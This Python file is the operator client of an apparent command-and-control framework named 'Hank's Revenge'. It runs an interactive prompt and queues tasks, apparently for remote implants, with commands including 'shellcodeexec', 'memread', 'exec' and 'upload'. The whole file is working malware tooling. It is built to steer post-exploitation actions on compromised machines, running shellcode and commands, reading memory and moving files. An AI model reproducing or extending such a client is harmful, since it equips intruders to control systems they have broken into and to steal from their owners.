from commands import CMD_IDS

from client_api import (
    check_task_result,
    display_pending_tasks,
    display_task_history,
    encode_arg_bytes,
    print_queue_result,
    submit_task,
)
from client_display import display_help, display_result

# Commands whose argument must be kept intact (not split on first space)
# — encode_arg_bytes handles the internal splitting for these.
_FULL_ARG_COMMANDS = {"upload", "shellcodeexec", "memread", "exec"}


def main():
    print("[*] Hank's Revenge operator client  (type 'help' for commands)")
    while True:
        try:
            user_input = input("\n[operator]> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not user_input:
            continue

        parts    = user_input.split(None, 1)
        cmd_name = parts[0].lower()
        arg      = parts[1] if len(parts) > 1 else ""

        if cmd_name == "help":
            display_help()
            continue

        if cmd_name == "exit":
            break

        if cmd_name == "pending":
            display_pending_tasks()
            continue

        if cmd_name == "history":
            display_task_history()
            continue

        if cmd_name == "check":
            if not arg:
                print("[!] Usage: check <task_id>")
                continue
            try:
                task_id = int(arg, 10)
            except ValueError:
                print("[!] Task id must be a decimal integer.")
                continue
            check_task_result(display_result, task_id)
            continue

        command_id = CMD_IDS.get(cmd_name)
        if command_id is None:
            print("[!] Unknown command. Type 'help' to list available commands.")
            continue

        try:
            arg_bytes = encode_arg_bytes(cmd_name, arg)
        except (ValueError, FileNotFoundError) as exc:
            print(f"[!] Argument error: {exc}")
            continue

        response = submit_task(command_id, arg_bytes)
        print_queue_result(response)


if __name__ == "__main__":
    main()
